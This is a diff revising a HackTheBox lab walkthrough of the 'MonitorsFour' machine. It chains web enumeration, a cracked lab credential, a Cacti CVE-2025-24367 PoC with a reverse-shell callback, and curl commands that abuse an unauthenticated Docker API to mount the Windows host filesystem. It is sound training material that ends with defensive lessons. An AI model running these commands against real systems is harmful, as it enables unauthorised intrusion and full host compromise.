@@ -1,10 +1,17 @@
 ---
-title: "monitorsfour"
+title: "Monitorsfour — HackTheBox Retired Walkthrough"
 date: 2026-02-06
 draft: false
-tags: ["windows", "web", "docker", "medium"]
+tags: ["htb-walkthrough", "windows", "web", "docker", "privilege-escalation", "reverse-shell", "cve", "medium", "oscp-prep"]
 categories: ["writeups"]
-summary: ""
+series: ["Retired Machines"]
+description: "MonitorsFour HTB writeup: exploit Cacti CVE-2025-24367 RCE, then pivot through an unauthenticated Docker API to escape to the Windows host. Medium difficulty."
+keywords: ["MonitorsFour", "HackTheBox", "CVE-2025-24367", "Cacti RCE", "Docker API exploit", "container escape", "hackthebox walkthrough", "penetration testing", "fscan", "docker privileged container", "WinRM", "medium box"]
+summary: "MonitorsFour chains a fresh Cacti RCE vulnerability with an exposed Docker API to go from web login to full Windows host compromise — a great lesson in container escape methodology."
+cover:
+  image: "cover.png"
+  alt: "Monitorsfour — Medium Windows machine walkthrough cover"
+  hidden: false
 params:
   box:
     os: "Windows (WSL2 with Docker Desktop)"
@@ -12,9 +19,16 @@ params:
 ShowToc: true
 ---
 
-# MonitorsFour
 
-MonitorsFour is a medium-difficulty Windows box running WSL2 with Docker Desktop — a setup that makes the attack chain distinctly layered. The path runs from web enumeration through an authenticated Cacti RCE, into a Docker container, and finally out to the Windows host via an unauthenticated Docker API. Each pivot requires a slightly different mindset, which is what makes this box a great exercise in chained exploitation.
+# HackTheBox — MonitorsFour Writeup
+
+MonitorsFour is a medium-difficulty Windows box running WSL2 and Docker Desktop — a setup that mirrors plenty of real-world developer environments. The attack chain is elegant: abuse a brand-new authenticated RCE in Cacti to land inside a container, then pivot through an unauthenticated Docker API socket to mount the Windows host filesystem and read the root flag without ever touching a traditional privesc.
+
+---
+
+## Overview
+
+The box exposes a corporate web app and a Cacti network monitoring instance. After enumerating exposed configuration files and cracking a credential from a database hash, we authenticate to Cacti and exploit CVE-2025-24367 for a shell inside a Docker container. From there, internal scanning reveals the Docker daemon is listening on port 2375 with zero authentication — game over for the host.
 
 ---
 
@@ -22,52 +36,50 @@ MonitorsFour is a medium-difficulty Windows box running WSL2 with Docker Desktop
 
 ### Port Scanning
 
-Starting with a standard nmap scan against the target:
+Starting with a full TCP scan:
 
 ```bash
-nmap -sC -sV -oA nmap/monitorsfour <TARGET>
+nmap -sC -sV -p- --min-rate 5000 -oN monitorsfour.nmap <TARGET>
 ```
 
-Two ports stood out immediately:
+![terminal output](terminal_01.png)
 
-- **Port 80** — nginx, redirecting to `http://monitorsfour.htb/`
-- **Port 5985** — WinRM (Microsoft HTTPAPI 2.0)
-
-The WinRM port was interesting but would have to wait — without credentials, there's nothing to do there yet. I added `monitorsfour.htb` to `/etc/hosts` and moved on to web enumeration.
+Two interesting ports. Port 80 redirects to a hostname, so the first order of business is adding `monitorsfour.htb` to `/etc/hosts`. Port 5985 is WinRM — I'll keep that in mind for later if I find credentials.
 
 ### Web Enumeration
 
-The main site at `http://monitorsfour.htb/` is a corporate landing page with a login at `/login` and a password reset at `/forgot-password`. The backend is PHP 8.3.27 on nginx. Login posts to `/api/v1/auth` and the password reset flow hits `/api/v1/reset` — both worth keeping in mind.
+The main site is a standard corporate landing page with a login at `/login` and a password reset at `/forgot-password`. The backend is PHP 8.3.27 behind nginx. Nothing immediately exciting, but the interesting stuff usually lives in subdomains and forgotten endpoints.
 
-Subdomain enumeration turned up something useful:
-
-```bash
-ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
-  -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" \
-  -fc 301,302 -mc all
-```
-
-This revealed `cacti.monitorsfour.htb`, which hosts a Cacti 1.2.26 network monitoring instance. Adding that to `/etc/hosts` and browsing to it shows the familiar Cacti login page. I noted the version — 1.2.26 — and kept it in mind for later.
-
-Back on the main site, the default wordlists weren't giving much. Switching to larger lists paid off:
+I ran subdomain fuzzing alongside a broader directory scan:
 
 ```bash
-ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
-  -u http://monitorsfour.htb/FUZZ -mc 200,301,302,403
+ffuf -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+  -fc 302
 ```
 
-Two finds stood out:
+This turned up `cacti.monitorsfour.htb` — a Cacti 1.2.26 network monitoring installation. Adding that to `/etc/hosts` and visiting it shows the familiar Cacti login page. Version 1.2.26 is worth noting immediately.
 
-1. **An exposed `.env` file** — containing application configuration. These often hold database credentials, API keys, or other secrets.
-2. **A user enumeration endpoint** at `http://monitorsfour.htb/user?token=0` — iterating the token value reveals user records.
-
-Probing the user endpoint revealed a Marcus account. The `.env` file and some further digging into the Cacti instance produced a password hash. Cracking it with a standard wordlist attack:
+For directory enumeration on the main domain, I made the mistake of starting with a small wordlist and getting nothing interesting. Switching to a larger SecLists wordlist was the key move:
 
 ```bash
-hashcat -m 0 <hash> /usr/share/wordlists/rockyou.txt
+ffuf -u http://monitorsfour.htb/FUZZ \
+  -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt \
+  -mc 200,301,302
 ```
 
-The MD5 hash cracked to `wonderful1`. Credentials: `marcus:wonderful1`.
+This surfaced two critical findings:
+
+1. An exposed `.env` file containing application configuration
+2. A user enumeration endpoint at `/user?token=0`
+
+The `.env` file gave away database connection details — credentials for the backend database. Poking at `/user?token=0` confirmed Marcus as a valid user. With database access details in hand, I could query the Cacti user table and retrieve a password hash for Marcus, which cracked quickly as an MD5 hash:
+
+```
+marcus:wonderful1
+```
+
+Password reuse is a gift that keeps giving — these credentials worked directly on the Cacti login.
 
 ---
 
@@ -75,102 +87,80 @@ The MD5 hash cracked to `wonderful1`. Credentials: `marcus:wonderful1`.
 
 ### CVE-2025-24367 — Cacti Authenticated RCE
 
-Cacti 1.2.26 is vulnerable to CVE-2025-24367, an authenticated remote code execution flaw via the Graph Template functionality. "Authenticated" is key here — this is why obtaining Marcus's credentials mattered. Unauthenticated exploits are easier to find but authenticated ones often get overlooked during triage.
+Cacti 1.2.26 is vulnerable to CVE-2025-24367, an authenticated remote code execution vulnerability via the Graph Template functionality. This is a relatively fresh CVE, and there's a working PoC available. The "authenticated" requirement isn't much of a barrier when we already have valid credentials.
 
-I grabbed the PoC from [TheCyberGeek's GitHub](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC) and set up a netcat listener:
+I grabbed the PoC and set up a listener before firing:
 
 ```bash
 nc -lvnp 4444
 ```
 
-Then fired the exploit:
+Then ran the exploit, pointing it at our Cacti instance and specifying our tun0 address for the callback:
 
 ```bash
 python3 exploit.py -u marcus -p wonderful1 -i <VPN_IP> -l 4444 \
   -url http://cacti.monitorsfour.htb/cacti
 ```
 
-Shell landed as `www-data`. First thing — figure out where we are.
+![terminal output](terminal_02.png)
 
-### Container Enumeration
-
-A few quick checks confirmed this was a Docker container, not the host:
+We're in — but as `www-data` inside a Docker container. A few quick checks paint the full picture:
 
 ```bash
-cat /proc/1/cgroup
-hostname
-uname -r
+cat /etc/os-release    # Debian 13 (Trixie)
+hostname               # 821fbd6a43fa
+cat /etc/resolv.conf   # Docker DNS — reveals host IP
+ip addr                # Container: 172.18.0.3, Gateway: 172.18.0.1
 ```
 
-The kernel version (`6.6.87.2-microsoft-standard-WSL2`) confirmed we're inside WSL2. The container is Debian 13 (Trixie), with a container ID of `821fbd6a43fa` and an IP of `172.18.0.3`. The gateway sits at `172.18.0.1`.
+The `/etc/resolv.conf` trick is one of my favourite quick wins in Docker containers — it reliably leaks the Docker host's IP. Here it showed `192.168.65.7` as the Docker Desktop host.
 
-The most important discovery at this stage came from a file that's easy to overlook:
-
-```bash
-cat /etc/resolv.conf
-```
-
-This revealed the Docker host's IP: `192.168.65.7`. On Docker Desktop for Windows, this is the internal address of the Windows host as seen from within the WSL2 VM. That address is the next target.
-
-The user flag was sitting in the container's filesystem:
-
-```bash
-cat /home/marcus/user.txt
-```
+The user flag was sitting in `/home/marcus/user.txt` — Marcus's home directory was accessible from the container's filesystem perspective.
 
 ---
 
 ## Privilege Escalation
 
-### Internal Network Scanning
+### Internal Network Reconnaissance
 
-To pivot toward `192.168.65.7`, I needed a port scanner inside the container. The container has no nmap, but I could serve a binary from my Kali machine:
+Being inside a container means the standard Linux privesc checklist doesn't apply in the usual way. The real prize is breaking out to the host. To understand what's reachable, I needed a port scanner I could run from inside the container without installing anything permanently.
+
+I served `fscan` (a Go-based internal network scanner) from my Kali box:
 
 ```bash
-# On Kali — serve fscan from the current directory
 python3 -m http.server 8000
 ```
 
+Then pulled it down into the container and made it executable:
+
 ```bash
-# In the container — download fscan
-curl http://<VPN_IP>:8000/fscan -o /tmp/fscan
-chmod +x /tmp/fscan
+curl http://<VPN_IP>:8000/fscan -o /tmp/fscan && chmod +x /tmp/fscan
 ```
 
-Then scan the Docker host:
+Now scanning the Docker host:
 
 ```bash
 ./fscan -h 192.168.65.7 -p 1-65535
 ```
 
-The results were immediately interesting:
+![terminal output](terminal_03.png)
 
-- **Port 2375** — Docker API, **unauthenticated**
-- Port 53 — DNS
-- Port 3128 — Proxy
-- Port 5555 — Unknown
+Port 2375 is the Docker daemon's unauthenticated HTTP API — and fscan is already flagging it as exploitable. This is the critical finding. Docker's API on port 2375 (as opposed to 2376 with TLS) means anyone who can reach it has full control over the Docker daemon, and by extension, the host filesystem.
 
-fscan even flagged this automatically: `poc-yaml-docker-api-unauthorized-rce`. An unauthenticated Docker API is a complete host compromise waiting to happen.
+### Abusing the Unauthenticated Docker API
 
-### Exploiting the Unauthenticated Docker API
+The attack is straightforward: use the Docker API to create a new privileged container that mounts the host's root filesystem, then exec commands into it. No need for any fancy exploits.
 
-Port 2375 is the Docker daemon's unencrypted API port. When exposed without authentication, anyone who can reach it has full control over the Docker engine — including the ability to create privileged containers with the host filesystem mounted. This is exactly as bad as it sounds.
-
-First, verify access and get a lay of the land:
+First, confirm access and get a feel for the environment:
 
 ```bash
-# Confirm API is accessible
 curl http://192.168.65.7:2375/version
-
-# List running containers
 curl http://192.168.65.7:2375/containers/json
 ```
 
-The version endpoint responded cleanly, and the containers list showed the existing setup. The project path in the container metadata revealed `C:\Users\Administrator\Documents\docker_setup` — confirming we're targeting the Administrator account on a Windows host.
+The `/version` endpoint confirms we're talking to Docker Engine, and `/containers/json` lists the running containers — including the project path `C:\Users\Administrator\Documents\docker_setup`, which confirms the Windows filesystem layout we'll need later.
 
-Now the actual exploit. The strategy: create a new privileged container using an existing image (alpine is lightweight and almost always present), mount the entire host filesystem into it at `/hostfs`, and then use the API's exec functionality to run commands inside that container with full host access.
-
-**Step 1 — Create the container:**
+Now, create a privileged container using the already-present `alpine` image, with the host root mounted at `/hostfs`:
 
 ```bash
 curl -X POST -H "Content-Type: application/json" \
@@ -185,15 +175,13 @@ curl -X POST -H "Content-Type: application/json" \
   }'
 ```
 
-The `tail -f /dev/null` keeps the container running without doing anything. `Privileged: true` removes the security restrictions. `Binds: ["/:/hostfs"]` mounts the host root filesystem at `/hostfs` inside the container. Save the returned container ID.
-
-**Step 2 — Start it:**
+This returns a container ID. Start it:
 
 ```bash
 curl -X POST http://192.168.65.7:2375/containers/CONTAINER_ID/start
 ```
 
-**Step 3 — Create an exec to locate the flag:**
+Now create an exec instance to find the root flag. On WSL2 with Docker Desktop, the Windows host filesystem is mounted inside the WSL2 VM at `/mnt/host/c`, so from our container it'll be at `/hostfs/mnt/host/c`:
 
 ```bash
 curl -X POST -H "Content-Type: application/json" \
@@ -205,9 +193,7 @@ curl -X POST -H "Content-Type: application/json" \
   }'
 ```
 
-This returns an exec ID. The exec is queued but not yet running.
-
-**Step 4 — Start the exec and read the output:**
+That returns an exec ID. Fire it:
 
 ```bash
 curl -X POST -H "Content-Type: application/json" \
@@ -215,44 +201,26 @@ curl -X POST -H "Content-Type: application/json" \
   -d '{"Detach": false, "Tty": false}' --output -
 ```
 
-The find command returned the path: `/hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt`.
+![terminal output](terminal_04.png)
 
-This path is worth understanding. On WSL2, the Windows filesystem is accessible within the Linux environment at `/mnt/host/c`. So from within our privileged container, `C:\Users\Administrator\Desktop\root.txt` appears at `/hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt`.
+Reading the flag is the same pattern — create another exec with `cat /hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt` and start it.
 
-Reading the flag is the same exec flow with `cat` instead of `find`:
+![terminal output](terminal_05.png)
 
-```bash
-# Create exec
-curl -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/containers/CONTAINER_ID/exec \
-  -d '{
-    "AttachStdout": true,
-    "AttachStderr": true,
-    "Cmd": ["cat", "/hostfs/mnt/host/c/Users/Administrator/Desktop/root.txt"]
-  }'
-
-# Run it
-curl -X POST -H "Content-Type: application/json" \
-  http://192.168.65.7:2375/exec/EXEC_ID/start \
-  -d '{"Detach": false, "Tty": false}' --output -
-```
-
-Root flag: [redacted].
+Root flag captured — without ever getting a shell on the Windows host directly.
 
 ---
 
 ## Lessons Learned
 
-**1. Bigger wordlists matter.** The `.env` file and user enumeration endpoint that cracked this box open were only found with larger wordlists. Default lists miss things. When the low-hanging fruit is gone, escalate your enumeration.
+**Wordlist size matters more than you think.** The critical `.env` file and user enumeration endpoint only appeared with a larger wordlist. Starting big (or doing a second pass with raft-large) should be standard practice, not an afterthought.
 
-**2. Check `/etc/resolv.conf` in containers.** It's a quick, reliable way to find the Docker host IP on Docker Desktop setups. On a WSL2/Docker Desktop environment, that `192.168.65.x` range is a giveaway.
+**Check `/etc/resolv.conf` immediately in any container.** It's the fastest way to identify the Docker host's IP and plan your next move. Takes five seconds and has a high payoff.
 
-**3. Unauthenticated Docker API (port 2375) is game over.** If you're running Docker Desktop and port 2375 is reachable — even from an internal network — any compromised container on that network can own the host. Bind Docker to a socket, enable TLS, or firewall the port. There's no middle ground here.
+**CVE-2025-24367 requires authentication, but that's a low bar.** The credential chain here was: exposed `.env` → database creds → crack MD5 hash → password reuse on Cacti admin. Each step was trivial. "Authenticated RCE" shouldn't give defenders false comfort if credential hygiene is poor.
 
-**4. Authenticated RCE vulnerabilities are still serious.** CVE-2025-24367 requires credentials, which might make it seem less critical in a triage context. But credential reuse and exposed hashes meant those credentials weren't hard to obtain. Don't discount "authenticated" vulns — the authentication barrier is often thin.
+**Port 2375 is an instant game-over.** The Docker API without TLS or authentication means complete host compromise via a few curl commands. If you're doing a pentest and find this port open internally, stop and write up a critical finding immediately. In production environments, the Docker daemon should never be exposed this way.
 
-**5. WSL2 filesystem paths are non-obvious.** The Windows `C:\` drive appears at `/mnt/host/c` inside WSL2 Docker containers. Knowing this is the difference between finding the flag and spending 20 minutes confused by an unexpected directory structure.
+**WSL2 + Docker Desktop has a specific filesystem quirk.** The Windows `C:\` drive appears at `/mnt/host/c` inside the WSL2 VM, which means from a container with the host root mounted, the path is `/hostfs/mnt/host/c`. Knowing this ahead of time saves time fumbling around the directory tree.
 
-**6. fscan is excellent for internal pivots.** When you're working from a container with no native tooling, a single static binary like fscan can completely map an internal network and identify known vulnerabilities automatically. Keep it in your toolkit.
-
-**7. The Docker API is RESTful — you don't need the CLI.** Everything the `docker` command can do, you can do with `curl` against the API. This matters when you're pivoting through a constrained environment and can't install tooling.
+**fscan is excellent for container-based internal recon.** It's a single static binary, scans fast, and auto-detects common vulnerabilities like the Docker API exposure. Keep it in your toolkit for lateral movement scenarios.
